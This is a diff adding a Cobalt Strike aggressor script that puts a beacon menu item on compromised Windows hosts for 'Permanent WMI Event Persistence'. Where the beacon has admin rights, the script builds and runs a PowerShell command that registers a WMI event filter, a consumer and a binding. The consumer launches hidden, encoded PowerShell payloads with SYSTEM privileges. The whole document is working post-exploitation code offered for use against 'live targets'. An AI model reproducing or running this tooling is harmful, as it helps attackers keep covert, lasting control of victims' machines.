@@ -1,0 +1,46 @@
+
+sub persistwmievent  {
+	$bid = $1;
+	if (-is64 $bid) {
+		$ExePath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -enc";
+	}
+	else {
+		$ExePath = "C:\\Windows\\powershell.exe -nop -w hidden -enc";
+	}
+
+	$dialog = dialog("Permanent WMI Event Persistence with PowerShell", %(eventfilter => "__EventFilter Name..", eventquery => "Event Query...(Win32 Classes)", payloadstring => "Encoded Payload String.."), lambda({
+		if ("$3['eventfilter']" ismatch '__EventFilter Name..' || "$3['eventquery']" ismatch 'Event Query...(Win32 Classes)' || "$3['payloadstring']" ismatch 'Encoded Payload String..') {
+			berror($bid, "\c4Please enter a valid __EventFilter Name, Event Query, and an Encoded Payload String.");
+			break;
+		}
+		else {
+			$powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name=\"".$3['eventfilter']."\";EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"".$3['eventquery']."\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name=\"".$3['eventfilter']."\";CommandLineTemplate =\"". $ExePath ." ".$3['payloadstring']."\"};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
+			bpowershell!($bid, $powershellcmd);
+			blog($bid, 'Permanently Storing '.$3['eventfilter'].' in root\CimV2..');
+			bpowershell($bid, 'Get-WmiObject __eventFilter -namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
+			bpowershell($bid, 'Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
+		}
+	}));
+	dialog_description($dialog, "Generates a Custom WMI Event using PowerShell for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload String must be converted to UTF-16LE, base64 encoded and under 1MB.**");
+	
+	drow_text($dialog, "eventfilter",  "Custom __EventFilter Name:");
+	drow_text($dialog, "eventquery", "Custom Event Query:");
+	drow_text($dialog, "payloadstring", "Custom Encoded Payload String:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+}
+
+popup beacon_bottom {
+	item "&Permanent WMI Event Persistence with PowerShell" {
+		local('$bid');
+		foreach $bid ($1) {
+			if (-isadmin $bid) {
+				persistwmievent($bid);
+			}
+			else {
+				berror($1, "\c4Persistence Requires Admin Level Privileges");
+			}
+		}
+	}
+}
